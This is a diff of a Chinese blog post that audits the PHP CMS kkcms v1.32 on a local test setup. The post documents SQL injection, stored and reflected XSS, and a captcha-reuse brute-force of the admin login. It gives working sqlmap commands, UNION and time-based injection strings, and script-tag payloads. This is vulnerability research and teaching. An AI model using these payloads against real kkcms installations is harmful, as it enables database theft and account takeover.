@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="kkcms审计, uf9n1x&#39;s blog">
+    <meta name="keywords" content="kkcms代码审计, uf9n1x&#39;s blog">
     <meta name="description" content="继初次选择xhcms审计审计之后，对代码审计来了兴趣，一处处分析，经历失败，重来，最后找到漏洞点的过程确实很不错。因此，在喜欢xhcms审计结束后就马不停蹄找了个小众一点的cms再开启一次审计，熟悉熟悉，之后计划开始浮现tp,yii之类框架">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>kkcms审计 | uf9n1x&#39;s blog</title>
+    <title>kkcms代码审计 | uf9n1x&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -294,12 +294,12 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">kkcms审计</h1>
+                    <h1 class="description center-align post-title">kkcms代码审计</h1>
                 </div>
             </div>
         </div>
@@ -323,35 +323,22 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                     
                     <div class="article-tag">
                         
+                            <a href="/tags/cms/">
+                                <span class="chip bg-color">cms</span>
+                            </a>
+                        
                             <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                                 <span class="chip bg-color">php代码审计</span>
                             </a>
                         
-                            <a href="/tags/cms/">
-                                <span class="chip bg-color">cms</span>
+                            <a href="/tags/php/">
+                                <span class="chip bg-color">php</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/php/" class="post-category">
-                                php
-                            </a>
-                        
-                            <a href="/categories/php/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                php代码审计
-                            </a>
-                        
-                            <a href="/categories/php/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/cms/" class="post-category">
-                                cms
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -360,7 +347,7 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-05-07
+                    2022-09-14
                 </div>
                 
 
@@ -392,6 +379,8 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>继初次选择xhcms审计审计之后，对代码审计来了兴趣，一处处分析，经历失败，重来，最后找到漏洞点的过程确实很不错。因此，在喜欢xhcms审计结束后就马不停蹄找了个小众一点的cms再开启一次审计，熟悉熟悉，之后计划开始浮现tp,yii之类框架内容，且行且记吧。</p>
+<span id="more"></span>
+
 <p>[toc]</p>
 <h2 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h2><h3 id="一、环境安装"><a href="#一、环境安装" class="headerlink" title="一、环境安装"></a>一、环境安装</h3><p>直接去github搜一搜kkcms源码，我这里选择了较老的版本:</p>
 <p><strong>kkcms-v1.32</strong></p>
@@ -399,12 +388,12 @@ color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>安装环境：</p>
 <p>使用phpstudy 5.6.27+mysql5.5.53进行搭建（这个cms版本比较老，用php高版本会出问题）。下载后，源码解压到phpstudy根目录，启动phpstudy，访问并安装即可。</p>
 <p><strong>ps:（安装时记得提前在phpstudy中mysql管理创建一个数据库（我这里创建一个kkcms数据库使用））</strong></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161135-4fd645aa-cddd-1.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d0d545f8c0d7a5c2a472f391ac3399aa.png"></p>
 <p>出现这样的界面就安装完成了：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161158-5d7f46f2-cddd-1.png"></p>
-<h3 id="二、先看看目录结构，了解下整体情况"><a href="#二、先看看目录结构，了解下整体情况" class="headerlink" title="二、先看看目录结构，了解下整体情况"></a>二、先看看目录结构，了解下整体情况</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161611-f4893efe-cddd-1.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6d9bcbee39ba5973f2f235c8b140a267.png"></p>
+<h3 id="二、先看看目录结构，了解下整体情况"><a href="#二、先看看目录结构，了解下整体情况" class="headerlink" title="二、先看看目录结构，了解下整体情况"></a>二、先看看目录结构，了解下整体情况</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/955dc4714265be523d8799095571ef58.png"></p>
 <p>都是些常见目录结构，这里就不一一介绍了。先直接丢进seay审计工具中看一下：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161625-fcda5c78-cddd-1.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c0d640062b76e9ce0b007e778cbcac7f.gif"></p>
 <p>还不少，224个可疑点，那就以这个为线索，慢慢来看：</p>
 <h3 id="三、漏洞"><a href="#三、漏洞" class="headerlink" title="三、漏洞"></a>三、漏洞</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="ucenter-x2F-reg-php"><a href="#ucenter-x2F-reg-php" class="headerlink" title="ucenter/reg.php"></a>ucenter/reg.php</h5><p>seay报警此文件存在sql注入漏洞，打开看一下代码：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
@@ -471,7 +460,7 @@ exit<span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>定义了addslashes_deep()方法对请求变量进行了转义处理，对预定义符号转义来防注入等攻击，但是。。。。问题来了，联系前面的ucenter/reg.php文件<strong>stripslashes()函数</strong>的处理，那不就是来了个负负得正吗？先添加转义，然后去除转义，带入查询，相当于没有进行防护，造成注入危险。</p>
 <p>直接sqlmap一把梭：抓包保存，sqlmapPOST注入打一下：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161647-09b7db3c-cdde-1.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8f4480896b52670ddf7ef2c329d81c03.png"></p>
 <p>可以看到已经成功注入出了数据库，后续时间关系就不等他注完了</p>
 <p>payload：</p>
 <pre class="line-numbers language-sql"><code class="language-sql">python2 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>r D:\python27\sqlmap\<span class="token number">aa</span><span class="token punctuation">.</span>txt <span class="token operator">-</span>p name <span class="token comment" spellcheck="true">--dbs --batch</span>
@@ -481,7 +470,7 @@ name<span class="token operator">=</span><span class="token number">1</span><spa
 name<span class="token operator">=</span><span class="token number">1</span><span class="token string">' AND (SELECT 3775 FROM (SELECT(SLEEP(5)))OXGU) AND '</span>XUOn<span class="token string">'='</span>XUOn<span class="token operator">&amp;</span>email<span class="token operator">=</span><span class="token number">1</span><span class="token variable">@qq.com</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>那么同样的思路，是不是所有引用了stripslashes()函数的地方都应该有同样的漏洞呢？想到就试试：全局搜索stripslashes()有：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161742-2b00d9ce-cdde-1.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/44444dcc22f735e6c4b602bc424aaea3.png"></p>
 <p>果然有发现，进去文件详细审查一下：</p>
 <h5 id="ucenter-x2F-active-php"><a href="#ucenter-x2F-active-php" class="headerlink" title="ucenter/active.php"></a>ucenter/active.php</h5><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'../system/inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -625,7 +614,7 @@ name<span class="token operator">=</span><span class="token number">1</span><spa
 <p>对$_GET[‘cid’]变量，不经过滤，直接单引号包裹，文件头没有引入转义函数文件，带入查询，典型的sql注入：sql注入（但是这里审计出来的代码闭合方式应该是单引号闭合，但是测试却失败了，这是怎么回事？）sqlmap跑一下看看：</p>
 <pre class="line-numbers language-python"><code class="language-python">python2 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://127.0.0.1/template/wapian/vlist.php?cid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>dbs <span class="token operator">-</span><span class="token operator">-</span>batch
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161910-5f0641e6-cdde-1.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/833150923b276fe85fbdf2e1cba2b7ef.png"></p>
 <p>可以看到，注出了数据库，payload:</p>
 <pre class="line-numbers language-sql"><code class="language-sql">cid<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x7162717a71</span><span class="token punctuation">,</span><span class="token number">0x4572725a7062476e5a734c4f51454742724f4579755449744967454b6a695461545a4857576a7952</span><span class="token punctuation">,</span><span class="token number">0x7170706271</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token comment" spellcheck="true">-- -</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -647,7 +636,7 @@ name<span class="token operator">=</span><span class="token number">1</span><spa
 <span class="token delimiter">?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>并没有对转义文件的引用，因此肯定存在该注入漏洞，直接sqlmap 跑一下，即可。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162028-8de75cde-cdde-1.png" alt="7.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/833150923b276fe85fbdf2e1cba2b7ef.png"></p>
 <h5 id="admin-x2F-cms-book-edit-php"><a href="#admin-x2F-cms-book-edit-php" class="headerlink" title="admin/cms_book_edit.php"></a><strong>admin/cms_book_edit.php</strong></h5><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">'select * from xtcms_book where id = '</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
@@ -738,7 +727,7 @@ id=1%20and%20ascii(left(database(),1))=107--+    #回显正常
 ?del=2%20and%20sleep(10)延时
 </code></pre>
 <p>的payload 成功进行了sql注入，我进行复现也确实能做到，<strong>可这和前面的分析互相矛盾了呀，这是为什么呢？有大师傅知道可以讲解一下吗？</strong></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162110-a6df701e-cdde-1.png" alt="15.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7554f0d0859eef3ee526360c813e2e9c.png"></p>
 <p>那么按照相同的思路，去查找到了后台所有的删除有关的文件，发现情况都是一样，因此这个cms存在一个全后台的delete删除的注入漏洞。</p>
 <h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><h5 id="x2F-youlian-php-存储型xss"><a href="#x2F-youlian-php-存储型xss" class="headerlink" title="/youlian.php  存储型xss"></a>/youlian.php  存储型xss</h5><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'system/inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -764,12 +753,12 @@ id=1%20and%20ascii(left(database(),1))=107--+    #回显正常
 <pre><code>&lt;script&gt;alert(/123456/)&lt;/script&gt;
 </code></pre>
 <p>留言，然后进后台查看，成功弹窗，存储型xss一枚：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162131-b3597880-cdde-1.png" alt="8.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/309d569fc80ce3e5311ebc6682f03930.png"></p>
 <p>同样的思路，直接全局搜索</p>
 <pre><code>&lt;?php echo $_GET[
 </code></pre>
 <p>直接输出的地方是xss常出现的地方：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162144-bb37e5fa-cdde-1.png" alt="9.png"></p>
+<p><img src="/9.png"></p>
 <p>有收获，一个个看：</p>
 <h5 id="x2F-admin-x2F-cms-kamilist-php-反射型xss"><a href="#x2F-admin-x2F-cms-kamilist-php-反射型xss" class="headerlink" title="/admin/cms_kamilist.php 反射型xss"></a>/admin/cms_kamilist.php 反射型xss</h5><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'../system/inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -793,13 +782,13 @@ id=1%20and%20ascii(left(database(),1))=107--+    #回显正常
 <p>构造闭合payload,成功get一枚反射性xss</p>
 <pre><code>?id="&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;
 </code></pre>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162227-d4af234a-cdde-1.png" alt="10.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e98a8c280ad9ee47d0fdb9e0125346d8.png"></p>
 <p>同样的方法</p>
 <h5 id="x2F-wap-x2F-shang-php-反射型xss"><a href="#x2F-wap-x2F-shang-php-反射型xss" class="headerlink" title="/wap/shang.php 反射型xss"></a><strong>/wap/shang.php</strong> <strong>反射型xss</strong></h5><p>同样的漏洞原理，这里就不赘述了，直接看效果</p>
 <p>payload：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>fee<span class="token operator">=</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>wowoowo<span class="token operator">/</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162238-db490d1a-cdde-1.png" alt="11.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/09e270fb38d116b974f28ad69235dae6.png"></p>
 <h5 id="x2F-wap-x2F-movie-php"><a href="#x2F-wap-x2F-movie-php" class="headerlink" title="/wap/movie.php"></a>/wap/movie.php</h5><h5 id="x2F-wap-x2F-tv-php"><a href="#x2F-wap-x2F-tv-php" class="headerlink" title="/wap/tv.php"></a>/wap/tv.php</h5><h5 id="x2F-wap-x2F-zongyi-php"><a href="#x2F-wap-x2F-zongyi-php" class="headerlink" title="/wap/zongyi.php"></a>/wap/zongyi.php</h5><h5 id="x2F-wap-x2F-dongman-php-反射型xss"><a href="#x2F-wap-x2F-dongman-php-反射型xss" class="headerlink" title="/wap/dongman.php 反射型xss"></a>/wap/dongman.php 反射型xss</h5><p>这几个文件都有同样的xss漏洞，形成原理也一样，就拿其中一个进行分析。查看movie.php 里的内容。</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#/wap/movie.php</span>
 <span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'../system/inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -827,7 +816,7 @@ id=1%20and%20ascii(left(database(),1))=107--+    #回显正常
 <pre class="line-numbers language-python"><code class="language-python">payload<span class="token punctuation">:</span> ?m<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token operator">/</span>wowowo<span class="token operator">/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>成功弹窗，反射型xss到手</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162252-e3a995b0-cdde-1.png" alt="12.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8c4e2ca605c0586515fd5455c63a18a8.png"></p>
 <h5 id="x2F-book-php-和-x2F-wap-x2F-book-php-存储型xss"><a href="#x2F-book-php-和-x2F-wap-x2F-book-php-存储型xss" class="headerlink" title="/book.php  和/wap/book.php 存储型xss"></a>/book.php  和/wap/book.php 存储型xss</h5><p>查看文件，关键代码：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'../system/inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
@@ -865,10 +854,10 @@ id=1%20and%20ascii(left(database(),1))=107--+    #回显正常
 <p>对传入的$_POST[‘content’]变量经过null_back()、addslashes()等方法进行处理，又引入转义文件转义处理，同样的情况我们在之前的***/youlian.php  存储型xss<em><strong>部分已经提到过，即经过一系列处理，该变量实际上进行了一次我称之为“</strong>负负得正</em>*”的转义操作，相当于没有防范，又和后端数据库进行了交互，所以此处就形成了一个存储型xss,访问该文件，构造闭合，形成payload进行攻击尝试：</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>wowo<span class="token operator">/</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162309-ed9b23ea-cdde-1.png" alt="13.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cc7466fcddac52a815d47d4cc874b32a.png"></p>
 <p>再想，这里是留言板，那么后台应该也会引用这里的留言内容，方便管理员进行管理，因此查找到后台对应文件：</p>
 <h5 id="x2F-admin-x2F-cms-book-php-存储型xss"><a href="#x2F-admin-x2F-cms-book-php-存储型xss" class="headerlink" title="/admin/cms_book.php 存储型xss"></a>/admin/cms_book.php 存储型xss</h5><p>访问，果然弹窗。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162316-f201ab84-cdde-1.png" alt="14.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/820084147fb5d1193a28f51352a6357b.png"></p>
 <p>具体代码：</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token operator">&lt;</span>?php
 include<span class="token punctuation">(</span><span class="token string">'../system/inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -963,7 +952,7 @@ $result <span class="token operator">=</span> mysql_query<span class="token punc
 <span class="token delimiter">?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>在登陆界面检验session和传入的verifycode是否相等，如果访问失败，就会会进行刷新跳转，然后重新执行一次JS代码，</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162341-00e38eec-cddf-1.png" alt="16.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3852c2c15af88ba78584153f133dfac5.png"></p>
 <p>搜索关键词，看看这个js是干嘛的，在**../system/verifycode.php**文件中，发现</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -985,9 +974,9 @@ $result <span class="token operator">=</span> mysql_query<span class="token punc
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>js引用该文件生成四位随机数作为验证码，这里有一点就是：<em><strong>burp默认不解析js</strong></em>，而文件中也没有时间限制，那么我们就可以用burp抓包，摒除js，重用该验证码对后台密码进行爆破，实现一下：</p>
 <p>添加爆破位置</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162353-079f070c-cddf-1.png" alt="17.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2d5170ed4c9af658d63e0f1e14720992.png"></p>
 <p>我这里为了演示效果，因此字典里我就随便写几个密码，把正确密码放进去，进行爆破演示</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162407-106f706a-cddf-1.png" alt="19.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c74116ab4d3b082357c46292129e0a03.png"></p>
 <p>可以看到，成功爆破出后台密码123456.</p>
 <h4 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h4><p>到这里，我能找到的关于这个cms的漏洞就结束了，另外，在网上看到师傅们还发现有一个上传漏洞，分析我就不献丑了，链接给出来，大家可以参考一下</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44713013/article/details/122187203?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=2">https://blog.csdn.net/qq_44713013/article/details/122187203?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=2</a></p>
@@ -1022,7 +1011,7 @@ $result <span class="token operator">=</span> mysql_query<span class="token punc
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://uf9n1x.top/2022/05/07/kkcms-shen-ji/">https://uf9n1x.top/2022/05/07/kkcms-shen-ji/</a>
+                    <a href="https://uf9n1x.top/2022/09/14/kkcms-dai-ma-shen-ji/">https://uf9n1x.top/2022/09/14/kkcms-dai-ma-shen-ji/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1060,12 +1049,16 @@ $result <span class="token operator">=</span> mysql_query<span class="token punc
                     
                         <div class="article-tag">
                             
+                                <a href="/tags/cms/">
+                                    <span class="chip bg-color">cms</span>
+                                </a>
+                            
                                 <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                                     <span class="chip bg-color">php代码审计</span>
                                 </a>
                             
-                                <a href="/tags/cms/">
-                                    <span class="chip bg-color">cms</span>
+                                <a href="/tags/php/">
+                                    <span class="chip bg-color">php</span>
                                 </a>
                             
                         </div>
@@ -1411,60 +1404,43 @@ $result <span class="token operator">=</span> mysql_query<span class="token punc
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/05/07/kkcms-shen-ji/">
+                <a href="/2022/09/26/za-ji-yi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="kkcms审计">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="杂记（一）">
                         
-                        <span class="card-title">kkcms审计</span>
+                        <span class="card-title">杂记（一）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            杂记（一）由安装DS_Store文件泄露处理工具引发的一系列问题
+安装ds_store_exp-master工具，下载解压之后需要先安装依赖包 cmd执行：**pip2 install ds-store requests** 发现报错：
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-07
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-26
+                        </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/php/" class="post-category">
-                                    php
-                                </a>
-                            
-                            <a href="/categories/php/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                    php代码审计
-                                </a>
-                            
-                            <a href="/categories/php/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/cms/" class="post-category">
-                                    cms
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            uf9n1x
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                        <span class="chip bg-color">php代码审计</span>
-                    </a>
-                    
-                    <a href="/tags/cms/">
-                        <span class="chip bg-color">cms</span>
+                    <a href="/tags/%E6%9D%82%E8%AE%B0/">
+                        <span class="chip bg-color">杂记</span>
                     </a>
                     
                 </div>
@@ -1520,12 +1496,12 @@ $result <span class="token operator">=</span> mysql_query<span class="token punc
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                        <span class="chip bg-color">php代码审计</span>
-                    </a>
-                    
                     <a href="/tags/cms/">
                         <span class="chip bg-color">cms</span>
+                    </a>
+                    
+                    <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">php代码审计</span>
                     </a>
                     
                 </div>
@@ -1756,7 +1732,7 @@ $result <span class="token operator">=</span> mysql_query<span class="token punc
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">93.9k</span>
+                        class="white-color">94.4k</span>
             
             
             
